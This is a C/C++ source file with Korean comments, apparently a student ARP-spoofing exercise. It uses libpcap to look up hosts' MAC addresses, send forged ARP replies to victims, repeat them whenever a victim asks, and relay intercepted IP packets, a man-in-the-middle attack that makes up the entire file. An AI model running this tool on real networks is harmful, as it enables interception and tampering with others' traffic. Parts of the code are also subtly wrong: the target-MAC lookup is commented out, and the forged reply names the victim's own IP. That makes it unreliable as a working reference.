#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>

struct ethernet_header
{
    u_int8_t dst[6];        //destination mac
    u_int8_t src[6];        //source mac
    u_int16_t type;        //ethernet type = ARP
};

struct arp_header
{
    struct ethernet_header eth;    //arp 구조체와 한번에 이어서 쓰기 위하여 ethernet 구조체를 가져옴
    u_int16_t hard_type;        //hardware type -- ethernet(1)
    u_int16_t proc_type;        //protocol type -- ARP(0x0806)
    u_int8_t hard_len;        //Hardware size -- 6
    u_int8_t proc_len;        //Protocol size -- 4
    u_int16_t oper;            //Opcode -- request(1) , reply(2)
    u_int8_t sender_mac[6];        //Sender MAC address
    u_int8_t sender_ip[4];        //Sender IP address
    u_int8_t target_mac[6];        //Target MAC address
    u_int8_t target_ip[4];        //Target IP address
};
struct ip_header{
    uint8_t ver;
    uint8_t type;
    uint16_t len;
    uint16_t ident;
    uint16_t flag;
    uint8_t ttl;
    uint8_t proc;
    uint16_t chec;
    uint8_t src_ip[4];
    uint8_t dst_ip[4];
};
struct packet
{
    struct ethernet_header eth;    //arp 구조체와 한번에 이어서 쓰기 위하여 ethernet 구조체를 가져옴
    struct arp_header arp;
};
struct packet2
{
    struct arp_header arp;
    struct ip_header ip;
};

struct session
{
    u_int8_t sender_mac[6];        //Sender MAC address
    u_int8_t sender_ip[4];        //Sender IP address
    u_int8_t target_mac[6];        //Target MAC address
    u_int8_t target_ip[4];
};

void usage() {
    printf("syntax: pcap_test <interface> <sender_ip> <target_ip> <sender_ip> <tartget_ip>\n");    //인자값이 모자라면 출력하려고 선언해둠
    printf("sample: pcap_test wlan0\n");
}
int my_dev(const char *dev, u_int8_t *mac)
{
    struct ifreq ifr;            //Ethernet 관련 정보 필요할때 사용
    int fd;
    int rv; // return value - error value from df or ioctl call

    /* determine the local MAC address */
    strcpy(ifr.ifr_name, dev);                //2번째 인자의 값을 1번째 인자로 복사 (ifr.ifr_name 은 interface name)
    fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);     //AF_INET = 네트워크 도메인 소켓(IPv4 프로토콜), Sock_Dgram = 데이터그램 소켓, IPProto_ip = IP 프로토콜 사용
    if (fd < 0)
        rv = fd;
    else
    {
        rv = ioctl(fd, SIOCGIFHWADDR, &ifr);            //SIOCGIFHWADDR 요청
        if (rv >= 0) /* worked okay */
            memcpy(mac, ifr.ifr_hwaddr.sa_data, IFHWADDRLEN);    //SIOCGIFHWADDR 를 요청하면 ifreq 구조체의 sa_data를 6바이트 읽어낸다.
    }

    return rv;
}

void get_info(pcap_t *handle, u_int8_t *smac, u_int8_t *tmac,  u_int8_t *sip, u_int8_t* tip){
    struct arp_header arp;

    memcpy(arp.eth.dst, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
    memcpy(arp.eth.src,smac, 6);
    arp.eth.type = (u_int16_t)ntohs(0x0806);
    arp.hard_type = (u_int16_t)ntohs(0x0001);
    arp.proc_type = (u_int16_t)ntohs(0x0800);
    arp.hard_len = (u_int8_t)0x06;
    arp.proc_len = (u_int8_t)0x04;
    arp.oper = (u_int16_t)ntohs(0x0001);

    memcpy(arp.target_mac,"\x00\x00\x00\x00\x00\x00",6);
    memcpy(arp.sender_mac ,smac, 6);
    memcpy(arp.target_ip ,tip, 4);
    memcpy(arp.sender_ip ,sip, 4);
    printf("========================================\n");
    printf("SEND\n");
    printf("ARP REQUEST-----------------------------\n");
    printf("Ethernet Dest \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp.eth.dst[0],arp.eth.dst[1],arp.eth.dst[2],arp.eth.dst[3],arp.eth.dst[4],arp.eth.dst[5]);
    printf("Ethernet Source : %02X-%02X-%02X-%02X-%02X-%02X\n", arp.eth.src[0],arp.eth.src[1],arp.eth.src[2],arp.eth.src[3],arp.eth.src[4],arp.eth.src[5]);
    printf("Ethernet Type \t: ARP (0x%04X)\n", (arp.eth.type<<8&0xFF00)|(arp.eth.type>>8&0x00FF));
    printf("---\n");
    printf("Hardware Type \t: Ethernet (%X)\n", arp.hard_type>>8);
    printf("Protocol Type \t: IPv4 (0x%04X)\n", (arp.proc_type<<8 & 0xFF00)|(arp.proc_type>>8 & 0x00FF));
    printf("Hardware Length : %X\n", arp.hard_len);
    printf("Protocol Length : %X\n", arp.proc_len);
    printf("Opcode \t\t: Request(%X)\n", arp.oper>>8);
    printf("Sender MAC \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp.sender_mac[0],arp.sender_mac[1],arp.sender_mac[2],arp.sender_mac[3],arp.sender_mac[4],arp.sender_mac[5]);
    printf("Sender IP \t: %u.%u.%u.%u\n", arp.sender_ip[0],arp.sender_ip[1],arp.sender_ip[2],arp.sender_ip[3]);
    printf("Target MAC \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp.target_mac[0],arp.target_mac[1],arp.target_mac[2],arp.target_mac[3],arp.target_mac[4],arp.target_mac[5]);
    printf("Target IP \t: %u.%u.%u.%u\n", arp.target_ip[0],arp.target_ip[1],arp.target_ip[2],arp.target_ip[3]);
    printf("========================================\n\n");


    pcap_sendpacket(handle,(u_char*)&arp, sizeof(arp));

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        struct arp_header * arp_msg = (arp_header *)packet;		//arp_header 구조체 가져와서 arp_msg 만들고 패킷을 가져옴
        if(ntohs(arp_msg->oper) == 0x0002){				//ARP reply 일때
            int i;
            for(i=0; i<4 ; i++){
                if(arp_msg->sender_ip[i] != tip[i])			//sender_ip와 tar_ip가 같지 않을 때 arp msg를 넣고 break;
                    break;
            }
            if(i==4){
                for(int i=0; i<6; i++){
                    tmac[i] = arp_msg->sender_mac[i];        //arg_msg를 sender_mac에 넣고 tar_mac에 저장

                }
                break;
            }
        }
    }

}

void reply(pcap_t *handle, u_int8_t *smac, u_int8_t *tmac, u_int8_t *sip, u_int8_t* tip){
    struct arp_header arp;
    memcpy(arp.eth.dst, tmac, 6);
    memcpy(arp.eth.src,smac, 6);
    arp.eth.type = (u_int16_t)ntohs(0x0806);
    arp.hard_type = (u_int16_t)ntohs(0x0001);
    arp.proc_type = (u_int16_t)ntohs(0x0800);
    arp.hard_len = (u_int8_t)0x06;
    arp.proc_len = (u_int8_t)0x04;
    arp.oper = (u_int16_t)ntohs(0x0002);

    memcpy(arp.target_mac,tmac,6);
    memcpy(arp.sender_mac ,smac, 6);
    memcpy(arp.target_ip ,tip, 4);
    memcpy(arp.sender_ip ,sip, 4);

    printf("SEND REPLY\n");
    printf("ARP REPLY-------------------------------\n");
    printf("Ethernet Dest \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp.eth.dst[0],arp.eth.dst[1],arp.eth.dst[2],arp.eth.dst[3],arp.eth.dst[4],arp.eth.dst[5]);
    printf("Ethernet Source : %02X-%02X-%02X-%02X-%02X-%02X\n", arp.eth.src[0],arp.eth.src[1],arp.eth.src[2],arp.eth.src[3],arp.eth.src[4],arp.eth.src[5]);
    printf("Ethernet Type \t: ARP (0x%04X)\n", (arp.eth.type<<8&0xFF00)|(arp.eth.type>>8&0x00FF));
    printf("---\n");
    printf("Hardware Type \t: Ethernet (%X)\n", arp.hard_type>>8);
    printf("Protocol Type \t: IPv4 (0x%04X)\n", (arp.proc_type<<8 & 0xFF00)|(arp.proc_type>>8 & 0x00FF));
    printf("Hardware Length : %X\n", arp.hard_len);
    printf("Protocol Length : %X\n", arp.proc_len);
    printf("Opcode \t\t: Reply(%X)\n", arp.oper>>8);
    printf("Sender MAC \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp.sender_mac[0],arp.sender_mac[1],arp.sender_mac[2],arp.sender_mac[3],arp.sender_mac[4],arp.sender_mac[5]);
    printf("Sender IP \t: %u.%u.%u.%u\n", arp.sender_ip[0],arp.sender_ip[1],arp.sender_ip[2],arp.sender_ip[3]);
    printf("Target MAC \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp.target_mac[0],arp.target_mac[1],arp.target_mac[2],arp.target_mac[3],arp.target_mac[4],arp.target_mac[5]);
    printf("Target IP \t: %u.%u.%u.%u\n", arp.target_ip[0],arp.target_ip[1],arp.target_ip[2],arp.target_ip[3]);
    printf("========================================\n");

    pcap_sendpacket(handle,(u_char*)&arp, sizeof(arp));

}

bool chk_arp(const u_char* packet, uint8_t* mac){
    struct arp_header arp;
    int type;

    memcpy(&arp.eth, packet, 14);
    type = (arp.eth.type<<8&0xFF00)|(arp.eth.type>>8&0x00FF);
    if(type == 0x0806) {
        if(!memcmp(arp.eth.dst, mac, 6) || !memcmp(arp.eth.dst, "\xff\xff\xff\xff\xff\xff", 6)) return true;
    }
    return false;
}

bool chk(const u_char* packet, session sess){
    struct arp_header arp;
    struct ip_header ip;
    int type;

    memcpy(&arp.eth, packet, 14);
    memcpy(&ip, packet+14, 20);
    type = (arp.eth.type<<8 & 0xFF00)|(arp.eth.type>>8 & 0x00FF);
    if(type == 0x0800) {
    if(!memcmp(arp.eth.src, sess.sender_mac, 6) && !memcmp(arp.eth.dst, sess.target_mac, 6)) return true;
    }
    return false;
}

void relay(const u_char *pack, u_int8_t *mac, session sess){
    struct packet2 *packet = (packet2*)pack;
    memcpy(packet->arp.eth.src, mac, 6);
    memcpy(packet->arp.eth.dst, sess.target_mac, 6);
}


void char_int(char* char_ip, u_int8_t* ip){
    char* ip1=strtok(char_ip,".");            //맨처음 ./ARPSpoofing ens33 ip ip 하면서 받아온 인자 값들을 문자형에서 정수형으로 변환
    char* ip2=strtok(NULL,".");            //.을 기점으로 문자열 분리하여 char를 int형으로 변환해줌
    char* ip3=strtok(NULL,".");
    char* ip4=strtok(NULL,".");
    ip[0]=(u_int8_t)atoi(ip1);
    ip[1]=(u_int8_t)atoi(ip2);
    ip[2]=(u_int8_t)atoi(ip3);
    ip[3]=(u_int8_t)atoi(ip4);
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        usage();
        return -1;
    }
    if ((argc-2)%2 != 0) {
        printf("Try Again...\n");
        return -1;
    }
    char* dev = argv[1];

    u_int8_t *src_mac=(u_int8_t*)malloc(sizeof(u_int8_t)*6);        //src_mac을 선언, malloc으로 크기를 동적으로 할당해줌
    my_dev(dev,src_mac);


    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }
           //1번째 인자값 --> ens33

    int sess_num=(argc-2)/2;
    session* sess = new session[sess_num];
    for (int i=0; i<sess_num; i++){
        inet_aton(argv[2+2*i], (in_addr*)sess[i].sender_ip);
        inet_aton(argv[3+2*i], (in_addr*)sess[i].target_ip);
        get_info(handle, src_mac, sess[i].sender_mac, sess[i].sender_ip, sess[i].target_ip);
        //get_info(handle, src_mac, sess[i].target_mac, sess[i].target_ip, sess[i].sender_ip);
    }
    for (int i=0; i<sess_num; i++){
        reply(handle, src_mac, sess[i].sender_mac, sess[i].sender_ip, sess[i].target_ip);
        //reply(handle, src_mac, sess[i].target_mac, sess[i].target_ip, sess[i].sender_ip);
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        for (int i=0; i<sess_num; i++){
            if(chk_arp(packet, sess[i].sender_mac)){
                reply(handle, src_mac, sess[i].sender_mac, sess[i].sender_ip, sess[i].target_ip);
                continue;
            }
        }
        for (int i=0; i<sess_num; i++){
            if(chk(packet, sess[i])){
                relay(packet, src_mac, sess[i]);
                pcap_sendpacket(handle, packet, header->caplen);
            }
        }
    }



    pcap_close(handle);

    return 0;

}
